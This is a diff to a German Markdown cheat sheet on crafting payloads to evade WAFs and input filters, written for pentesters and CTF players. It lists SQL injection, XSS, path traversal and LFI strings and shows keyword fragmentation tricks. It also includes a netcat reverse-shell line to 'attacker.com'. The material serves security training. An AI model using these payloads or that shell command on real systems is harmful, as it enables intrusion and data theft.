@@ -3,11 +3,24 @@
 **Ziel dieser Datei:**  
 Diese Datei bietet eine kompakte Übersicht über Techniken zur Erstellung und Modifikation von Payloads – speziell im Hinblick auf die Umgehung von Web Application Firewalls (WAF), Filtern und anderen sicherheitsrelevanten Eingabekontrollen. Sie richtet sich vor allem an Penetration Tester, CTF-Spieler und Red Team-Mitglieder, die mit komplexen Eingabefiltern konfrontiert sind.
 
-> ⚠️ **Disclaimer:** Diese Inhalte dienen ausschließlich zu Schulungs- und Testzwecken in autorisierten Umgebungen. Die Anwendung in produktiven oder fremden Systemen ohne ausdrückliche Genehmigung ist illegal.
+> **Disclaimer:** Diese Inhalte dienen ausschließlich zu Schulungs- und Testzwecken in autorisierten Umgebungen. Die Anwendung in produktiven oder fremden Systemen ohne ausdrückliche Genehmigung ist illegal.
 
 ---
 
-## 🔧 Typische Encoding-Techniken
+## Inhaltsverzeichnis
+- [Typische Encoding-Techniken](#typische-encoding-techniken)
+- [Evasion-Techniken bei WAF / Inputfilter](#evasion-techniken-bei-waf--inputfilter)
+- [Keywords fragmentieren](#keywords-fragmentieren)
+- [Zeitbasierte Payloads (blind testing)](#zeitbasierte-payloads-blind-testing)
+- [Beispiele nach Angriffsart](#beispiele-nach-angriffsart)
+- [Hinweise](#hinweise)
+- [Nützliche Tools](#nützliche-tools)
+- [Haftungsausschluss](#haftungsausschluss)
+
+---
+
+
+## Typische Encoding-Techniken
 
 ### 1. **URL-Encoding**
 Wird oft verwendet, um Sonderzeichen zu maskieren.
@@ -39,7 +52,7 @@ echo base64_decode('ZWNobyAnSGFja2VkIQ==');
 
 ---
 
-## 3. Hex-Encoding / Char-Bypass
+### 3. Hex-Encoding / Char-Bypass
 Alternative Darstellung für Payloads.
 
 ```sql
@@ -58,8 +71,8 @@ Oder
 
 ---
 
-## 🥷 Evasion-Techniken bei WAF / Inputfilter
-### 🪤 Zeichen-Splitting / Padding
+## Evasion-Techniken bei WAF / Inputfilter
+### Zeichen-Splitting / Padding
 ```html
 <scr<script>ipt>
 ```
@@ -77,7 +90,7 @@ Oder
 
 ---
 
-## 🔀 Keywords fragmentieren
+## Keywords fragmentieren
 ```sql
 UNION/**/SELECT
 ```
@@ -87,7 +100,13 @@ ec/*comment*/ho "test";
 
 ---
 
-## ⏳ Zeitbasierte Payloads (blind testing)
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+## Zeitbasierte Payloads (blind testing)
 Nützlich bei blind RCE oder SQLi:
 
 ```sql
@@ -99,21 +118,21 @@ ping -c 5 127.0.0.1
 
 ---
 
-## 🧪 Beispiele nach Angriffsart
-### 📚 SQL Injection
+## Beispiele nach Angriffsart
+### SQL Injection
 - ' OR 1=1 --
 - `admin'/**/OR/**/1=1--+`
 - UNION SELECT NULL,NULL,NULL--
 - CONCAT(CHAR(117,115,101,114),CHAR(112,119))
 
-### 🐚 Remote Code Execution (RCE)
+### Remote Code Execution (RCE)
 ```bash
 127.0.0.1|echo hacked
 127.0.0.1;nc -e /bin/bash attacker.com 4444
 127.0.0.1&&sleep 5
 ```
 
-### 🖼️ Cross-Site Scripting (XSS)
+### Cross-Site Scripting (XSS)
 
 ```html
 <img src=x onerror=alert(1)>
@@ -121,7 +140,7 @@ ping -c 5 127.0.0.1
 <svg/onload=alert(document.domain)>
 ```
 
-### 📂 Directory Traversal / LFI
+### Directory Traversal / LFI
 
 ```bash
 ../../../../etc/passwd
@@ -129,17 +148,26 @@ ping -c 5 127.0.0.1
 php://filter/convert.base64-encode/resource=index.php
 ```
 
-
 ---
 
-## 📌 Hinweise
+## Hinweise
 - Unterschiedliche Filter verlangen unterschiedliche Bypässe. Teste iterativ.
 - In CTFs werden häufig Custom-Filter eingebaut – Payload-Crafting ist oft die Lösung.
 - Nutze Burp Suite's Repeater oder Tools wie `wfuzz`, `ffuf`, `sqlmap` für Automatisierung.
 - Viele WAFs prüfen nur Signaturen -> ungewöhnliche Kodierungen oder Fragmentierungen helfen oft.
+
 ---
 
-## ⚠️ Haftungsausschluss
+## Nützliche Tools
+- [🔍 HackBar (Burp Extension)](https://portswigger.net/bappstore/93c19861f4df4e60bd9d4568cdd97ed6)
+- [🧪 PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [⚡ SecLists (Payload Collections)](https://github.com/danielmiessler/SecLists?utm_source=chatgpt.com)
+- [🔎 FuzzDB (Web Fuzzing Payloads)](https://github.com/fuzzdb-project/fuzzdb?utm_source=chatgpt.com)
+
+
+----
+
+## Haftungsausschluss
 
 Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.
 
@@ -148,7 +176,15 @@ Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisi
 Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
 Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.
 
+[Disclaimer](/00-disclaimer/disclaimer.md)
+
 --- 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 Stay curious – stay secure. 🔐
 
@@ -156,9 +192,3 @@ Stay curious – stay secure. 🔐
 🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!
 
 ---
-
-## 🧰 Nützliche Tools
-- [🔍 HackBar (Burp Extension)](https://portswigger.net/bappstore/93c19861f4df4e60bd9d4568cdd97ed6)
-- [🧪 PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
-- [⚡ SecLists (Payload Collections)](https://github.com/danielmiessler/SecLists?utm_source=chatgpt.com)
-- [🔎 FuzzDB (Web Fuzzing Payloads)](https://github.com/fuzzdb-project/fuzzdb?utm_source=chatgpt.com)
